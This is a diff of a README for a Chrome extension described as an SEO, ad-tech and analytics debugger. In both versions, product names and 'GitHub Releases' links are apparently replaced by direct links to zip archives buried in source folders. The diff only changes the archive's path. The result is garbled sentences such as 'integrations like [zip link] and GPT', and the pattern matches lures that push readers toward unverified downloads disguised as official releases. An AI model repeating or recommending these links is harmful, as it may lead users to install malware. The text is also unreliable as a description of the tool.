@@ -1,6 +1,6 @@
 # 🛠️ web-publisher-debugger - Debug Your Website with Ease
 
-Welcome to the web-publisher-debugger! This Chrome extension helps you debug SEO elements, AdTech integrations like https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip and GPT, and tracking tools such as GA4 and GTM. It uses AI to analyze your setup and provide insights that can enhance your website’s performance. 
+Welcome to the web-publisher-debugger! This Chrome extension helps you debug SEO elements, AdTech integrations like https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip and GPT, and tracking tools such as GA4 and GTM. It uses AI to analyze your setup and provide insights that can enhance your website’s performance. 
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ To start using the web-publisher-debugger, follow the simple steps below.
 
 ## 📥 Download Now
 
-[![Download Release](https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip%20Latest%20Release-green)](https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip)
+[![Download Release](https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip%20Latest%20Release-green)](https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip)
 
 ## 🔧 System Requirements
 
@@ -20,7 +20,7 @@ Before you download and install the extension, make sure your system meets these
 
 ## 📂 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip).
+1. Visit this page to download: [GitHub Releases](https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip).
 2. On the Releases page, locate the most recent version of the web-publisher-debugger.
 3. Click on the appropriate file for your operating system to download the extension.
 4. Once the file is downloaded, find the file in your downloads folder.
@@ -35,7 +35,7 @@ Before you download and install the extension, make sure your system meets these
 Once installed, the web-publisher-debugger offers the following features:
 
 - **SEO Debugging**: Analyze your website’s SEO elements to debug issues that could affect your rankings.
-- **AdTech Integration Checks**: Check integrations like https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip and Google Publisher Tag for proper setup and performance.
+- **AdTech Integration Checks**: Check integrations like https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip and Google Publisher Tag for proper setup and performance.
 - **Tracking Insights**: Gain insights on tracking systems like Google Analytics 4 and Google Tag Manager to ensure accurate data collection.
 - **AI-Powered Analysis**: Utilize AI tools to provide suggestions for improvements in your web publishing efforts.
 
@@ -69,6 +69,6 @@ We value your feedback! If you encounter issues or have suggestions for improvem
 
 Join our community of users and developers. Reach out on social media or forums to share experiences and tips related to web publishing and debugging.
 
-Remember to check the [GitHub Releases](https://raw.githubusercontent.com/Abhinav5P/web-publisher-debugger/main/src/components/adtech/prebid/web-publisher-debugger-v3.7.zip) page for the latest updates and downloads.
+Remember to check the [GitHub Releases](https://github.com/Abhinav5P/web-publisher-debugger/raw/refs/heads/main/src/ai/web-publisher-debugger-2.6.zip) page for the latest updates and downloads.
 
 Thank you for choosing web-publisher-debugger!
